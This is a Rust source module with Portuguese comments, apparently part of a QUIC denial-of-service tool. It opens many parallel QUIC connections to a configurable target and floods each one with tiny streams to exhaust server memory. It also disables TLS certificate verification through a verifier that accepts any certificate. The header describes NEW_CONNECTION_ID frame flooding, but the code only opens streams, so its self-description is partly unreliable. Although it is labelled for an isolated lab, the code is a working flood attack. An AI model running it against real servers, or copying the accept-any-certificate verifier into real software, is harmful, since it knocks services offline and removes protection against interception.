//! Vetor 2 — NEW_CONNECTION_ID Frame Flooding via QUIC legítimo.
//!
//! Estabelece conexões QUIC reais com o servidor e solicita o número máximo
//! de novos CIDs via frames NEW_CONNECTION_ID, forçando o servidor a manter
//! entradas extras na RAM (exaustão de memória via "ID Reservation Attack").
//!
//! Referência: RFC 9000 §19.15 — NEW_CONNECTION_ID Frames

use std::{net::SocketAddr, sync::Arc, time::Instant};

use anyhow::Result;
use quinn::{ClientConfig, Endpoint};
use tracing::{info, warn};

use crate::{
    config::{AttackConfig, FramesFloodConfig},
    metrics::MetricsCollector,
};

/// Configuração TLS mínima que aceita qualquer certificado (apenas para lab isolado).
/// Debug é obrigatório pelo trait bound de ServerCertVerifier no rustls 0.23.
#[derive(Debug)]
struct InsecureVerifier;

impl rustls::client::danger::ServerCertVerifier for InsecureVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

fn insecure_client_config() -> ClientConfig {
    let mut tls_config = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(InsecureVerifier))
        .with_no_client_auth();

    tls_config.alpn_protocols = vec![b"h3".to_vec()];

    ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(tls_config)
            .expect("Configuração TLS inválida"),
    ))
}

/// Uma única conexão que envia múltiplos streams vazios para simular
/// a solicitação de novos CIDs. Cada stream aberto força o servidor a
/// alocar recursos de sessão adicionais.
async fn flood_single_connection(
    endpoint: Endpoint,
    target: SocketAddr,
    ids_per_conn: usize,
    metrics: Arc<MetricsCollector>,
    deadline: Instant,
) -> Result<()> {
    let conn = endpoint
        .connect(target, "lab.target")?
        .await?;

    metrics.set_active_connections(1);

    let mut sent = 0usize;

    while sent < ids_per_conn && Instant::now() < deadline {
        // Abre e fecha um stream unidirecional mínimo — cada abertura
        // força o servidor a processar um novo contexto de CID
        let mut send = conn.open_uni().await?;
        // Payload mínimo para completar o stream
        send.write_all(b"\x00").await?;
        let _ = send.finish();

        let pkt_size = 37u64; // estimativa conservadora
        metrics.inc_packets(1);
        metrics.inc_bytes(pkt_size);
        sent += 1;
    }

    conn.close(0u32.into(), b"lab-done");
    metrics.set_active_connections(0);
    Ok(())
}

/// Lança múltiplas conexões QUIC em paralelo realizando frame flood.
pub async fn run_frame_flood(
    target: String,
    _attack_cfg: AttackConfig,
    frames_cfg: FramesFloodConfig,
    metrics: Arc<MetricsCollector>,
    deadline: Instant,
) -> Result<()> {
    let target_addr: SocketAddr = target.parse()?;
    let client_cfg = insecure_client_config();

    info!(
        connections = frames_cfg.connections,
        ids_per_conn = frames_cfg.ids_per_conn,
        "Frame flood iniciado"
    );

    let mut tasks = Vec::with_capacity(frames_cfg.connections);

    for conn_id in 0..frames_cfg.connections {
        if Instant::now() >= deadline {
            break;
        }

        let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
        endpoint.set_default_client_config(client_cfg.clone());

        let m = metrics.clone();
        let ids = frames_cfg.ids_per_conn;

        let task = tokio::spawn(async move {
            if let Err(e) = flood_single_connection(endpoint, target_addr, ids, m, deadline).await {
                warn!(conn_id, err = %e, "Conexão encerrou com erro");
            }
        });
        tasks.push(task);
    }

    for task in tasks {
        let _ = task.await;
    }

    info!("Frame flood finalizado");
    Ok(())
}
